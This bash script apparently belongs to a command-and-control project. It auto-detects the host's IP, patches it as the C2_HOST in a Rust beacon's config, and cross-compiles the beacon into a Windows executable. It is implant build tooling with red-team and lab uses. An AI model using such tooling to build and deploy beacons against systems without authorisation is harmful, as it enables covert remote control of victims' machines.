#!/bin/bash

set -e

PROJECT_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BEACON_DIR="$PROJECT_ROOT/beacon-rs"
ASSETS_DIR="$PROJECT_ROOT/assets"
CONFIG="$BEACON_DIR/src/config.rs"

# Auto-detect IP from wlo1
IP=$(ip addr show wlo1 | grep "inet " | awk '{print $2}' | cut -d/ -f1)

if [ -z "$IP" ]; then
    echo "[!] Could not detect IP from wlo1. Is the interface up?"
    exit 1
fi

echo "[*] Detected IP: $IP"

# Patch config.rs with current IP
sed -i "s|pub const C2_HOST: &str = \"http://.*\";|pub const C2_HOST: \&str = \"http://$IP:8080\";|" "$CONFIG"

echo "[*] Patched config.rs with http://$IP:8080"

echo "[*] Building beacon for Windows (x86_64)..."
cd "$BEACON_DIR"
cargo build --release --target x86_64-pc-windows-gnu

echo "[*] Copying beacon.exe to assets/..."
mkdir -p "$ASSETS_DIR"
cp "$BEACON_DIR/target/x86_64-pc-windows-gnu/release/beacon.exe" "$ASSETS_DIR/beacon.exe"

echo "[+] Done! Beacon at assets/beacon.exe"
